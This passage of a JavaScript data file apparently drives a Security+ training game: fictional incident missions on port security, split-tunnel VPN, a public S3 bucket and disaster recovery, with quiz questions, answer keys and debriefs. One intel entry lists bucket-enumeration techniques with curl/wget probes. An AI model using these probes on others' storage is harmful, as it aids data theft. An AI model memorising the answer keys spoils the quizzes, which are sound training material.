The attacker initially gained access by plugging a rogue device into an unused Ethernet port in a conference room.

PORT SECURITY CONTROLS (not deployed in your environment):

1. 802.1X (Port-Based Network Access Control):
   - Requires authentication before granting network access
   - Uses EAP (Extensible Authentication Protocol)
   - Workflow:
     a. Device connects to switch port
     b. Switch demands credentials (certificate, username/password)
     c. RADIUS server validates credentials
     d. Only if authenticated: switch allows traffic
   - Your switches: No 802.1X configured — any device plugged in gets network access

2. MAC Address Filtering:
   - Allows only pre-approved MAC addresses on each port
   - Weak security (MAC addresses easily spoofed)
   - Your switches: Not configured

3. DHCP Snooping:
   - Prevents rogue DHCP servers from issuing IP addresses
   - Your switches: Not enabled

FINDING: The attacker plugged into port Gi0/24, received an IP via DHCP, and immediately had Layer 2 access to the entire VLAN. With 802.1X, the switch would have demanded credentials and blocked the rogue device.`,
        critical: false
      },
      {
        id: 'bypass-05',
        type: 'log',
        label: 'Screened Subnet Analysis',
        content: `NETWORK ARCHITECTURE DIAGRAM:

Current setup:
  [Internet] → [Firewall] → [IPS] → [Internal Network: web servers, DB, workstations — all on 10.10.0.0/16]

Recommended architecture — Screened Subnet (DMZ):
  [Internet] → [Firewall 1] → [DMZ: web servers only] → [Firewall 2] → [Internal: DB, workstations]

A Screened Subnet (also called DMZ - Demilitarized Zone) places public-facing servers in an isolated network segment between two firewalls. The outer firewall allows only HTTP/HTTPS to the DMZ. The inner firewall allows only the database protocol (port 3306) FROM the DMZ TO the internal database server — and nothing else.

Your flat architecture meant: Once the attacker compromised the web server (on 10.10.50.15), they had direct access to internal databases, file servers, and workstations on the same network. A screened subnet would have contained the breach to the DMZ.

ACL (Access Control List) rule that should exist on inner firewall:
  - ALLOW 10.10.50.15 (web server) → 10.10.100.20 (DB) port 3306
  - DENY all other traffic FROM DMZ TO internal
  - Implicit deny at the end of the ACL (default deny-all rule)`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the BEST combination of controls to prevent this attack from succeeding again?',
      options: [
        'Deploy anomaly-based IDS in monitoring mode and increase firewall log verbosity',
        'Enable SSL decryption on the IPS, restrict firewall rule to specific application, deploy 802.1X on switch ports',
        'Replace the NGFW with a traditional stateful firewall and disable the IPS to reduce latency',
        'Implement MAC address filtering on all switch ports and enable DHCP relay'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Anomaly-based IDS in monitoring mode would only alert AFTER the attack. It does not prevent anything. Increasing log verbosity does not block unauthorized traffic — it just generates more logs.',
        'CORRECT: SSL decryption allows the IPS to inspect encrypted payload and detect data exfiltration patterns. Restricting the firewall rule to a specific application (not "ANY") prevents abuse of the open port. 802.1X prevents rogue devices from accessing the network by requiring authentication at the switch port. This is defense in depth.',
        'INCORRECT: Traditional firewalls are LESS capable than NGFWs — they only inspect Layer 3-4 (IP/port), not application content. Disabling the IPS removes a critical security layer. This makes the problem worse.',
        'INCORRECT: MAC filtering is weak (easily spoofed) and operationally burdensome. DHCP relay is for routing DHCP requests across subnets — it does not provide access control or traffic inspection.'
      ]
    },

    debrief: `This incident covers CompTIA Objective 3.2: Secure Communication/Access. The attack bypassed security appliances because of misconfigurations and missing controls.

Key concepts learned:
  - IDS (Intrusion Detection System): Monitors and ALERTS on suspicious traffic (passive)
  - IPS (Intrusion Prevention System): Monitors and BLOCKS malicious traffic (active, inline)
  - Signature-based detection: Matches known attack patterns (fast, accurate for known threats)
  - Anomaly-based detection: Detects deviations from baseline (catches unknowns, higher false positives)
  - NGFW: Inspects application-layer content (Layer 7), not just IP/port (Layer 3-4)
  - Deep Packet Inspection (DPI): Examines payload data, not just headers
  - Screened Subnet (DMZ): Isolates public-facing servers between two firewalls
  - 802.1X: Port-based network access control using EAP authentication
  - Implicit deny: Firewall ACLs should end with deny-all rule

The lesson: Security appliances must be properly configured. An NGFW with DPI disabled is just an expensive stateful firewall.`,

    escalation: `The breach exposed 18GB of customer PII: names, emails, hashed passwords, and payment card metadata. Regulatory fines under GDPR and PCI-DSS: $2.4M. Customer churn: 12% canceled accounts. The security team is mandated to conduct a full architecture redesign with screened subnets, SSL decryption at the IPS layer, 802.1X on all access ports, and explicit application-aware firewall rules. Estimated cost: $450K and 6 months of implementation.`,

    refs: [
      { source: 'Study Guide', section: '3.2 - Network Appliances', page: 48 },
      { source: 'Study Guide', section: '3.2 - IDS and IPS', page: 50 },
      { source: 'Study Guide', section: '3.2 - Firewalls and DMZ', page: 52 }
    ]
  },

  // ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.2)
  // Teaches: VPN Types, IPsec, SSL/TLS VPN, Split Tunnel, SD-WAN, SASE
  // ============================================================
  {
    id: 'MISSION-020',
    title: 'The Split Decision',
    domain: 'Security Architecture',
    objectiveCodes: ['3.2'],
    threatLevel: 'critical',
    tags: ['VPN', 'Remote Access', 'Split Tunnel', 'IPsec', 'SASE'],
    briefing: `URGENT INCIDENT: A remote employee's home network was compromised while connected to the corporate VPN. At 16:42 UTC, threat intelligence flagged unusual lateral movement from the employee's VPN IP (172.16.45.88) — internal file shares were being accessed and copied to an external IP in Belarus. The employee reports their home router was recently infected with malware, but they assumed the VPN protected corporate resources. Your security architect needs to know: how did malware on a home network traverse the VPN tunnel, and what configuration mistake allowed this?`,

    intel: [
      {
        id: 'vpn-01',
        type: 'log',
        label: 'VPN Configuration Audit',
        content: `VPN PROFILE ANALYSIS — Remote Access SSL VPN:

Connection type: SSL/TLS VPN (clientless web portal + thick client app)
Protocol: TLS 1.3 over port 443
Authentication: Username/password (MFA NOT enforced)
Encryption: AES-256-GCM

TUNNEL CONFIGURATION:
  Mode: SPLIT TUNNEL (enabled)
  Routes pushed to client:
    - 10.0.0.0/8 → VPN tunnel (corporate network)
    - 172.16.0.0/12 → VPN tunnel (internal services)
    - 0.0.0.0/0 → Local gateway (DEFAULT ROUTE — internet traffic bypasses VPN)

SPLIT TUNNEL EXPLAINED:
  In split tunnel mode, only traffic destined for corporate networks goes through the VPN. All other traffic (web browsing, streaming, personal apps) goes directly through the user's local internet connection.

  Pros:
    - Reduced VPN server load (corporate doesn't carry Netflix traffic)
    - Faster internet speeds for the user
    - Lower bandwidth costs

  Cons:
    - User's device is on TWO networks simultaneously (corporate VPN + untrusted home network)
    - If the home network is compromised, malware can pivot through the VPN-connected device into corporate

FULL TUNNEL (the alternative):
  ALL traffic routes through the VPN, including internet browsing. The corporate network becomes the user's internet gateway. More secure (all traffic inspected by corporate security stack) but higher bandwidth cost.`,
        critical: true
      },
      {
        id: 'vpn-02',
        type: 'forensic',
        label: 'Malware Analysis and Attack Path',
        content: `INCIDENT TIMELINE RECONSTRUCTION:

16:12 UTC — Employee connects to corporate VPN from home (IP: 198.51.100.44)
16:14 UTC — VPN assigns internal IP: 172.16.45.88
16:15 UTC — Employee's device is now DUAL-HOMED:
  - Adapter 1 (Wi-Fi): 192.168.1.45 (home network, compromised router)
  - Adapter 2 (VPN): 172.16.45.88 (corporate network)

16:18 UTC — Malware on home router (192.168.1.1) performs ARP spoofing attack
  - Redirects employee's traffic through malicious gateway
  - Installs additional payload on employee's laptop (192.168.1.45)

16:25 UTC — Malware on laptop discovers VPN interface (172.16.45.88)
  - Scans 10.0.0.0/8 for SMB shares
  - Finds accessible file server: 10.10.50.100 (marketing files)

16:42 UTC — Exfiltration begins:
  - Malware copies 4.2GB from \\\\fileserver\\marketing to external IP 185.230.45.12 (Belarus)
  - Uses the VPN tunnel to reach internal shares, then routes exfil traffic through the LOCAL gateway (split tunnel allows internet direct access)

CRITICAL FINDING: Split tunnel allowed the device to be on both the compromised home network AND the trusted corporate network simultaneously. The laptop became a bridge between two security zones with different trust levels.`,
        critical: true
      },
      {
        id: 'vpn-03',
        type: 'report',
        label: 'VPN Technologies Comparison',
        content: `VPN TYPES (CompTIA Security+ Objectives):

1. IPsec VPN (Internet Protocol Security):
   - Operates at Layer 3 (network layer)
   - Encrypts entire IP packets
   - Two modes:
     a. Transport mode: Encrypts payload only (host-to-host)
     b. Tunnel mode: Encrypts entire packet including headers (site-to-site)
   - Common for site-to-site VPNs (branch office to HQ)
   - Requires client software or OS built-in support
   - Protocols: ESP (Encapsulating Security Payload), AH (Authentication Header)

2. SSL/TLS VPN:
   - Operates at Layer 4-7 (session/application layer)
   - Uses standard TLS over TCP 443 (looks like HTTPS traffic)
   - Two types:
     a. Clientless (web portal access — just use a browser)
     b. Thick client (downloadable VPN app for full network access)
   - More firewall-friendly (port 443 is usually open)
   - Your environment: Uses this type

3. Split Tunnel vs. Full Tunnel:
   - Split tunnel: Corporate traffic → VPN, internet → local gateway
   - Full tunnel: ALL traffic → VPN (more secure, more bandwidth)

4. Always-On VPN:
   - Automatically connects when device powers on
   - User cannot disable it
   - Ensures traffic is always protected (assuming full tunnel)`,
        critical: false
      },
      {
        id: 'vpn-04',
        type: 'report',
        label: 'SD-WAN and SASE Overview',
        content: `EMERGING ARCHITECTURES (Context for modern VPN alternatives):

SD-WAN (Software-Defined Wide Area Network):
  - Replaces traditional MPLS circuits with internet-based connectivity
  - Dynamically routes traffic across multiple links (broadband, LTE, fiber)
  - Centrally managed via cloud controller
  - Can integrate VPN for site-to-site encryption
  - Use case: Connecting branch offices to HQ without expensive MPLS

SASE (Secure Access Service Edge):
  - Pronounced "sassy"
  - Combines networking and security into a cloud-delivered service
  - Components:
    a. SD-WAN (connectivity)
    b. Cloud-delivered firewall (FWaaS)
    c. Secure web gateway (SWG)
    d. ZTNA (Zero Trust Network Access)
    e. CASB (Cloud Access Security Broker)
  - Concept: Users and devices connect to the nearest SASE point-of-presence (PoP), which enforces security policies before allowing access to corporate resources
  - Eliminates the need for traditional VPN concentrators and backhauling traffic to HQ

Why SASE matters for this incident:
  A SASE architecture would have enforced zero-trust policies BEFORE granting access to file shares. Even with a compromised home network, the malware would need to:
    1. Authenticate the user (MFA)
    2. Verify device posture (OS patched, antivirus running, disk encrypted)
    3. Pass through cloud-based firewall inspection

Traditional VPN only checks: "Is the user authenticated?" Then grants full network access. SASE continuously verifies trust.`,
        critical: false
      },
      {
        id: 'vpn-05',
        type: 'alert',
        label: 'Endpoint Detection and Response Log',
        content: `EDR ALERT — Endpoint: LAPTOP-JDOE-42 (172.16.45.88):

Suspicious process detected:
  Process: svchost.exe (masquerading as legitimate Windows service)
  Parent: explorer.exe
  Network connections:
    - Outbound SMB (port 445) to 10.10.50.100 (file server) — ALLOWED
    - Outbound HTTPS (port 443) to 185.230.45.12 (Belarus) — ALLOWED

Host-based firewall (Windows Defender):
  Status: ENABLED
  Rule: Allow outbound on all ports (default Windows config)

Device posture issues found:
  - OS patch level: 147 days behind
  - Antivirus definition: 22 days out of date
  - Disk encryption: NOT enabled
  - VPN connection: Active, but no pre-connection posture check enforced

LESSON: VPN grants network access, but it does NOT verify device security hygiene. Network Access Control (NAC) or Zero Trust Network Access (ZTNA) should verify:
  - Device is patched
  - Antivirus is running and updated
  - Disk is encrypted
  - No unauthorized software present

Your VPN has no posture checking. It assumes if the user authenticates, the device is trustworthy. This assumption failed.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what VPN configuration change would MOST effectively prevent this type of attack?',
      options: [
        'Switch from SSL/TLS VPN to IPsec VPN in transport mode',
        'Disable split tunnel and enforce full tunnel mode with posture checking',
        'Increase VPN encryption from AES-256 to AES-512',
        'Deploy SD-WAN to replace the VPN concentrator'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: IPsec vs SSL/TLS is a protocol difference. Both can use split tunnel, and both are vulnerable to dual-homed device attacks. Switching protocols does not solve the split tunnel risk.',
        'CORRECT: Full tunnel mode forces ALL traffic through the VPN, preventing the device from being dual-homed on both the home network and corporate network simultaneously. Adding posture checking (via NAC or ZTNA) ensures the device is patched and secure BEFORE granting access. This combination addresses both the split tunnel risk and device hygiene.',
        'INCORRECT: AES-512 does not exist. The encryption strength is not the issue here — the VPN tunnel was properly encrypted. The problem was the split tunnel topology allowing simultaneous access to two networks.',
        'INCORRECT: SD-WAN is for site-to-site connectivity (branch offices), not remote user access. It does not solve the split tunnel problem or device posture verification.'
      ]
    },

    debrief: `This incident covers CompTIA Objective 3.2: Secure Communication. The attack succeeded because split tunnel VPN allowed the device to bridge a compromised home network and the corporate network simultaneously.

Key concepts learned:
  - VPN types: IPsec (Layer 3, site-to-site) vs SSL/TLS (Layer 4-7, remote access)
  - Split tunnel: Corporate traffic through VPN, internet direct (faster, less secure)
  - Full tunnel: All traffic through VPN (slower, more secure)
  - Dual-homed devices: Connected to two networks simultaneously (risky with split tunnel)
  - SD-WAN: Software-defined WAN for site-to-site connectivity
  - SASE: Cloud-delivered network + security services (modern VPN alternative)
  - Posture checking: Verify device security (patches, AV, encryption) before granting access

The lesson: Split tunnel is convenient but dangerous for remote workers. Full tunnel + posture checking prevents compromised home networks from becoming a bridge into corporate resources.`,

    escalation: `The malware exfiltrated 4.2GB of marketing strategy documents, product roadmaps, and unreleased campaign materials. A competitor announced a nearly identical product 6 weeks later. Legal estimates competitive harm at $3.8M. The board mandates immediate VPN reconfiguration: full tunnel mode, MFA enforcement, pre-connection posture checks, and a 12-month roadmap to replace traditional VPN with a SASE architecture. IT estimates 400 remote users will complain about slower internet speeds when full tunnel is enforced.`,

    refs: [
      { source: 'Study Guide', section: '3.2 - VPN Technologies', page: 54 },
      { source: 'Study Guide', section: '3.2 - Secure Access Models', page: 56 },
      { source: 'Study Guide', section: '3.2 - SD-WAN and SASE', page: 58 }
    ]
  },

  // ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.3)
  // Teaches: Data Classification, Data States, Data Protection (DLP, Encryption, Tokenization)
  // ============================================================
  {
    id: 'MISSION-021',
    title: 'The Public Bucket',
    domain: 'Security Architecture',
    objectiveCodes: ['3.3'],
    threatLevel: 'critical',
    tags: ['Data Protection', 'DLP', 'Encryption', 'Classification', 'Cloud Storage'],
    briefing: `BREACH NOTIFICATION: Security researcher "nullbyte42" just posted on Twitter: "Hey @YourCompany, you might want to secure s3://yourcompany-backups-2024/ — I found 47GB of customer PII in plaintext. Passwords, SSNs, payment info. All public. All unencrypted. DM me for coordinated disclosure." Your general counsel is demanding answers. How did a production database backup end up in a publicly accessible S3 bucket with zero encryption, and why didn't your data loss prevention (DLP) systems stop it?`,

    intel: [
      {
        id: 'data-01',
        type: 'forensic',
        label: 'S3 Bucket Configuration Analysis',
        content: `AWS S3 BUCKET AUDIT — "yourcompany-backups-2024":

Bucket properties:
  - Region: us-east-1
  - Versioning: DISABLED
  - Encryption: NONE (server-side encryption not configured)
  - Public Access: ENABLED (Block Public Access setting = OFF)
  - Bucket Policy: Allows "s3:GetObject" from Principal: "*" (anyone on the internet)
  - Logging: DISABLED (no access logs)

Contents discovered:
  - customer_db_backup_2024-11-15.sql (14.2 GB)
  - payment_records_export.csv (8.7 GB)
  - user_accounts_full_dump.json (24.1 GB)
  - Total: 47 GB of unencrypted PII

DATA STATES:
  1. Data at Rest: Stored on disk/database (this S3 bucket)
     - Protection: Encryption (AES-256), access controls, geographic restrictions

  2. Data in Transit: Moving across a network (file upload to S3)
     - Protection: TLS/SSL encryption, VPN tunnels, secure protocols

  3. Data in Use: Loaded in memory/RAM during processing
     - Protection: Secure enclaves, homomorphic encryption (rare), access controls

This bucket contains DATA AT REST. It should have been encrypted using:
  - SSE-S3 (Server-Side Encryption with S3-managed keys)
  - SSE-KMS (Server-Side Encryption with AWS Key Management Service keys)
  - Client-side encryption (encrypt before uploading)

Instead: ZERO encryption. A security researcher accessed the files via a simple HTTP GET request.`,
        critical: true
      },
      {
        id: 'data-02',
        type: 'report',
        label: 'Data Classification Framework',
        content: `DATA CLASSIFICATION ANALYSIS:

Your organization SHOULD classify data into sensitivity levels. The backup contained:

1. PUBLIC:
   - Marketing materials, press releases
   - No harm if exposed
   - Found in backup: Product images (appropriate for public bucket)

2. PRIVATE:
   - Employee personal info, internal memos
   - Limited internal distribution
   - Found in backup: Employee directory (should be access-controlled)

3. SENSITIVE:
   - Customer PII, health records, financial data
   - Requires encryption, strict access controls
   - Found in backup: Customer names, emails, phone numbers (MISCLASSIFIED)

4. CONFIDENTIAL:
   - Trade secrets, unreleased products, M&A plans
   - Requires encryption + DLP + need-to-know restrictions
   - Found in backup: Proprietary algorithms (MISCLASSIFIED)

5. CRITICAL:
   - Data that could cause severe harm if exposed
   - Maximum security controls (encryption, MFA, geographic restrictions, audit logs)
   - Found in backup: SSNs, payment card numbers, passwords (MISCLASSIFIED as backup data)

6. RESTRICTED (sometimes called "Regulated"):
   - Subject to legal/regulatory requirements (GDPR, HIPAA, PCI-DSS)
   - Found in backup: Payment card info (PCI-DSS violation — must be encrypted)

ROOT CAUSE: The backup script pulled data from the production database without regard for classification. No one reviewed the contents. No one asked, "Should unencrypted SSNs be in an S3 bucket?"`,
        critical: true
      },
      {
        id: 'data-03',
        type: 'log',
        label: 'Data Loss Prevention (DLP) Review',
        content: `DLP SYSTEM STATUS:

Your DLP solution: Symantec DLP Enterprise
Deployment: Network DLP (monitors egress traffic at firewall)

Configured policies:
  1. Block emails containing credit card numbers (PAN) — ACTIVE
  2. Block file uploads to personal Dropbox/Google Drive containing SSNs — ACTIVE
  3. Alert on confidential documents leaving via USB — ACTIVE

Coverage gaps discovered:
  - S3 uploads via AWS CLI NOT monitored (DLP sees encrypted TLS tunnel to AWS, cannot inspect)
  - Database exports NOT scanned before cloud upload
  - No content inspection at the application layer

WHAT IS DLP?
  Data Loss Prevention systems detect and block unauthorized transmission of sensitive data. They work by:
  - Content inspection: Scanning for patterns (SSN: XXX-XX-XXXX, credit cards, keywords)
  - Contextual analysis: File type, destination, user role
  - Actions: Block, alert, encrypt, quarantine

DLP TECHNOLOGIES:
  1. Network DLP: Monitors traffic at network egress points (firewalls, proxies)
  2. Endpoint DLP: Agent on user devices monitors file operations, clipboard, screen captures
  3. Cloud DLP: Integrated with SaaS apps (Google Workspace, Microsoft 365, AWS)

Your DLP is network-based only. It cannot see:
  - API calls to AWS (encrypted via TLS)
  - Direct S3 uploads from EC2 instances (internal AWS traffic)
  - Developer using AWS CLI from laptop (sees TLS to *.amazonaws.com, cannot inspect payload)

A cloud-native DLP or endpoint DLP would have flagged: "User jsmith is uploading a 14GB .sql file containing 47,000 SSNs to S3."`,
        critical: false
      },
      {
        id: 'data-04',
        type: 'report',
        label: 'Data Protection Technologies',
        content: `DATA PROTECTION METHODS (Beyond Encryption):

1. TOKENIZATION:
   - Replaces sensitive data with random tokens
   - Example: Credit card 4532-1111-2222-3333 → Token: TOK_8x7k2m
   - Token is stored in app database; real card number stored in secure token vault
   - Use case: PCI-DSS compliance (reduces scope — tokenized data is not considered card data)

2. DATA MASKING:
   - Obscures data while preserving format
   - Example: SSN 123-45-6789 → XXX-XX-6789 (show last 4 digits only)
   - Types:
     a. Static masking: Permanent (for dev/test databases)
     b. Dynamic masking: Real-time (based on user role — admin sees full data, support sees masked)
   - Use case: Non-production environments, customer service portals

3. ENCRYPTION:
   - Transforms data using algorithm + key
   - AES-256 (symmetric) — same key encrypts and decrypts
   - RSA (asymmetric) — public key encrypts, private key decrypts
   - Use case: Protecting data at rest and in transit

4. GEOGRAPHIC RESTRICTIONS:
   - Data residency controls: "EU citizen data must stay in EU datacenters"
   - Your backup: Stored in us-east-1 (Virginia), but contains EU customer data (GDPR violation)

5. ACCESS CONTROLS:
   - IAM policies, RBAC, least privilege
   - Your S3 bucket: Had NO access controls (public read)

6. SEGMENTATION:
   - Isolate sensitive data in separate databases/networks
   - Your backup: Mixed public marketing images with SSNs in the same bucket

The backup should have used: Encryption (AES-256) + Tokenization for payment data + Access controls (IAM policy limiting to backup role only) + Geographic restrictions (EU data in EU region).`,
        critical: false
      },
      {
        id: 'data-05',
        type: 'alert',
        label: 'Incident Timeline and Attribution',
        content: `INCIDENT TIMELINE:

2024-11-15 03:00 UTC — Automated backup job runs
  - Script: /opt/backups/db_export.sh
  - Exports entire production database to .sql file
  - Uploads to S3 bucket using AWS CLI: "aws s3 cp backup.sql s3://yourcompany-backups-2024/"
  - No encryption flag specified (should have used --sse AES256)

2024-11-15 03:47 UTC — Backup completes, file is public

2024-12-20 14:22 UTC — Security researcher scans public S3 buckets (common reconnaissance technique)
  - Tools: bucket-stream, GrayhatWarfare, S3Scanner
  - Discovers your bucket in 8 minutes
  - Downloads sample files, confirms PII

2024-12-20 15:10 UTC — Researcher posts to Twitter

HOW ATTACKERS FIND PUBLIC S3 BUCKETS:
  1. Enumerate common naming patterns: companyname-backups, companyname-data, companyname-prod
  2. Use tools that scrape Certificate Transparency logs, GitHub, DNS records for bucket names
  3. Check if bucket exists: curl https://bucketname.s3.amazonaws.com (if it returns XML, it exists)
  4. Check if public: wget https://bucketname.s3.amazonaws.com/filename (if it downloads, it's public)

Total exposure window: 35 days (from creation until discovery). Unknown how many others found it before the researcher disclosed it.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the MOST critical security control that was missing from this backup process?',
      options: [
        'Data masking to hide the last 4 digits of credit card numbers',
        'Encryption at rest using S3 server-side encryption (SSE-KMS) and access controls limiting bucket to backup role only',
        'Tokenization to replace all SSNs with random tokens',
        'Geographic restriction policies to prevent data from leaving the US'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Data masking helps reduce exposure, but it does not prevent unauthorized access. Masked data in a public bucket is still a breach (names, emails, addresses were exposed). Masking is a secondary control, not the primary fix.',
        'CORRECT: Encryption at rest ensures that even if the bucket is misconfigured as public, the data is unreadable without the decryption key. Access controls (IAM policy limiting s3:GetObject to the backup service role only) prevent public access entirely. These are the foundational controls for data at rest. Together, they address both confidentiality (encryption) and access (IAM).',
        'INCORRECT: Tokenization protects specific fields (credit cards, SSNs) by replacing them with tokens, but it does not protect the entire dataset (names, emails, addresses, order history). It also requires integration with a token vault. Encryption is simpler and protects everything.',
        'INCORRECT: Geographic restrictions address data residency compliance (GDPR, etc.), but they do not prevent unauthorized access. A bucket restricted to US regions can still be public and unencrypted within the US.'
      ]
    },

    debrief: `This incident covers CompTIA Objective 3.3: Data Protection. The backup contained sensitive data (PII, payment info, SSNs) that was unencrypted and publicly accessible.

Key concepts learned:
  - Data states: At rest (stored), in transit (moving), in use (processing)
  - Data classification: Public, private, sensitive, confidential, critical, restricted
  - Encryption at rest: SSE-S3, SSE-KMS, client-side encryption for cloud storage
  - Data Loss Prevention (DLP): Network, endpoint, cloud-based monitoring
  - Tokenization: Replace sensitive values with tokens (PCI-DSS compliance)
  - Data masking: Obscure data while preserving format (dev/test environments)
  - Geographic restrictions: Data residency requirements (GDPR, etc.)
  - Access controls: IAM policies, least privilege, need-to-know
  - Segmentation: Isolate sensitive data in separate storage

The lesson: Data at rest MUST be encrypted. Cloud storage MUST have access controls. Backups MUST be treated as sensitive as the production data they contain.`,

    escalation: `The exposed data includes 127,000 customer records spanning 14 EU countries. GDPR fines: €4.2M (4% of annual revenue). PCI-DSS violations: $500K penalty and suspension of payment processing for 90 days. 47 US states require breach notification letters (cost: $850K). Customer churn: 18% cancel accounts. Total cost: $12.7M. The CISO is terminated. The board mandates a comprehensive data governance program with classification policies, encryption-at-rest requirements, DLP deployment, and quarterly compliance audits.`,

    refs: [
      { source: 'Study Guide', section: '3.3 - Data Types and Classification', page: 60 },
      { source: 'Study Guide', section: '3.3 - Data States', page: 61 },
      { source: 'Study Guide', section: '3.3 - Data Protection Methods', page: 62 }
    ]
  },

  // ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.4)
  // Teaches: Resiliency, High Availability, Backups, RAID, DR, RTO/RPO, Power Resiliency
  // ============================================================
  {
    id: 'MISSION-022',
    title: 'The Untested Plan',
    domain: 'Security Architecture',
    objectiveCodes: ['3.4'],
    threatLevel: 'critical',
    tags: ['Disaster Recovery', 'Business Continuity', 'Backups', 'High Availability', 'Resilience'],
    briefing: `DISASTER SCENARIO: At 02:14 UTC, ransomware encrypted every server in your primary data center — 140 production systems offline. The attackers deleted local backups and Volume Shadow Copies. Your disaster recovery (DR) plan says: "In the event of primary site failure, fail over to the warm site in Denver." The operations team initiated the DR plan. Nine hours later, they\'re still trying to bring systems online. Backups are corrupted. The warm site hasn\'t been tested in 18 months. The CEO is demanding answers: why do we have a DR plan that doesn\'t work?`,

    intel: [
      {
        id: 'dr-01',
        type: 'report',
        label: 'Disaster Recovery Plan Review',
        content: `DR PLAN EXCERPT (Last updated: March 2023):

SITE TYPES:

1. HOT SITE:
   - Fully operational duplicate datacenter
   - Real-time data replication
   - Failover time: Minutes to hours
   - Cost: HIGHEST (maintaining duplicate infrastructure)
   - Your environment: NOT deployed

2. WARM SITE:
   - Datacenter with hardware and network, but not fully configured
   - Data replicated periodically (not real-time)
   - Failover time: Hours to days (requires configuration and restoration)
   - Cost: MEDIUM
   - Your environment: Denver warm site (supposed to be ready)

3. COLD SITE:
   - Empty datacenter with power, cooling, network
   - No hardware pre-installed
   - Failover time: Days to weeks (must ship/install hardware, restore data)
   - Cost: LOWEST
   - Your environment: NOT deployed

YOUR WARM SITE STATUS (discovered during failover attempt):
  - Hardware: 40% of required servers NOT installed (budget cuts in 2023)
  - Network: Firewall rules outdated (last sync: 14 months ago)
  - Data: Replication jobs failing for 6 weeks (no one noticed)
  - Testing: Last DR test drill: 18 months ago (never tested full failover)

Root cause: The DR plan existed on paper, but reality diverged from documentation. No validation. No testing.`,
        critical: true
      },
      {
        id: 'dr-02',
        type: 'forensic',
        label: 'Backup Analysis and Corruption Investigation',
        content: `BACKUP CONFIGURATION AUDIT:

Backup strategy (as documented):
  - Full backup: Weekly (Sunday 01:00 UTC)
  - Differential backup: Daily (incremental changes since last full)
  - Incremental backup: NOT configured
  - Offsite backup: Weekly copy to AWS S3 Glacier
  - Retention: 30 days local, 7 years offsite

BACKUP TYPES EXPLAINED:

1. FULL BACKUP:
   - Copies ALL data every time
   - Pros: Fastest restore (everything in one backup set)
   - Cons: Slowest backup, largest storage requirement
   - Restore procedure: Restore the full backup (single operation)

2. INCREMENTAL BACKUP:
   - Copies only data CHANGED since the last backup (full or incremental)
   - Pros: Fastest backup, smallest storage
   - Cons: Slowest restore (must restore full + every incremental in sequence)
   - Restore procedure: Restore full + incremental_1 + incremental_2 + ... + incremental_N

3. DIFFERENTIAL BACKUP:
   - Copies data CHANGED since the last FULL backup
   - Pros: Faster than full, faster restore than incremental
   - Cons: Backup size grows each day until next full backup
   - Restore procedure: Restore full + most recent differential (two operations)

4. SNAPSHOT:
   - Point-in-time copy of a volume/filesystem (often using copy-on-write)
   - Instant creation, minimal storage (only stores changes)
   - Use case: VM backups, rapid recovery
   - Your environment: VMware snapshots deleted by ransomware

FINDINGS:
  - Weekly full backups: Last successful full backup was 9 days ago (Sunday job failed, no alert)
  - Differential backups: Corrupted (ransomware encrypted the backup repository)
  - Offsite S3 Glacier: Last upload was 11 weeks ago (S3 sync script broken, no monitoring)
  - Result: NO viable backups available for 90% of systems`,
        critical: true
      },
      {
        id: 'dr-03',
        type: 'log',
        label: 'High Availability and RAID Configuration',
        content: `HIGH AVAILABILITY REVIEW:

Your environment SHOULD have been designed for high availability (HA):

HA COMPONENTS:

1. LOAD BALANCING:
   - Distributes traffic across multiple servers
   - If one server fails, load balancer redirects traffic to healthy servers
   - Types: Round-robin, least connections, geographic
   - Your environment: Load balancers deployed for web tier (this worked — web tier survived)

2. CLUSTERING:
   - Multiple servers act as one logical system
   - Active-active: All nodes handle traffic
   - Active-passive: One node handles traffic, others on standby
   - Your environment: Database cluster (3 nodes) — ALL encrypted by ransomware simultaneously (shared storage was the attack vector)

3. RAID (Redundant Array of Independent Disks):
   - Combines multiple disks for performance and/or redundancy
   - RAID 0: Striping (performance, NO redundancy — one disk fails = total data loss)
   - RAID 1: Mirroring (2 disks, identical copies — can lose 1 disk)
   - RAID 5: Striping + parity (min 3 disks, can lose 1 disk, rebuild from parity)
   - RAID 6: Striping + double parity (min 4 disks, can lose 2 disks)
   - RAID 10 (1+0): Mirrored stripes (min 4 disks, best performance + redundancy)
   - Your environment: RAID 5 on database servers
   - Problem: RAID protects against DISK failure, not ransomware (all disks encrypted)

LESSON: RAID is NOT a backup. It protects against hardware failure, not logical corruption or ransomware.`,
        critical: false
      },
      {
        id: 'dr-04',
        type: 'report',
        label: 'RTO, RPO, MTTR, MTBF Definitions',
        content: `RECOVERY METRICS (Critical for DR planning):

1. RTO (Recovery Time Objective):
   - Maximum acceptable downtime
   - "How long can we be offline before business impact is unacceptable?"
   - Your SLA: 4 hours for critical systems
   - Actual downtime: 9 hours and counting (RTO VIOLATED)

2. RPO (Recovery Point Objective):
   - Maximum acceptable data loss (measured in time)
   - "How much data can we afford to lose?"
   - Example: RPO = 1 hour means backups every hour, accept losing up to 1 hour of data
   - Your SLA: 24 hours (daily backups)
   - Actual data loss: 9 days (last successful backup)

3. MTTR (Mean Time to Repair):
   - Average time to fix a failure and restore service
   - Your historical MTTR: 2 hours for typical incidents
   - This incident: 9+ hours (DR plan failure extended MTTR)

4. MTBF (Mean Time Between Failures):
   - Average time between system failures
   - Used to predict reliability
   - Your historical MTBF: 720 hours (30 days)
   - This metric is for component failure, not ransomware attacks

CAPACITY PLANNING:
   - Ensuring DR site has sufficient resources to handle production load
   - Your warm site: Only 40% of servers installed (FAILED capacity planning)
   - Result: Even if failover succeeded, the warm site couldn\'t handle 100% of traffic

RECOVERY TESTING:
   - DR plans must be tested regularly (quarterly recommended)
   - Your last test: 18 months ago (just a tabletop exercise, not actual failover)
   - Result: Plan looked good on paper, failed in reality`,
        critical: false
      },
      {
        id: 'dr-05',
        type: 'alert',
        label: 'Power Resiliency Review',
        content: `POWER INFRASTRUCTURE AUDIT (Context for complete resiliency):

While power wasn't the issue in this incident, your power resiliency also has gaps:

POWER RESILIENCY COMPONENTS:

1. UPS (Uninterruptible Power Supply):
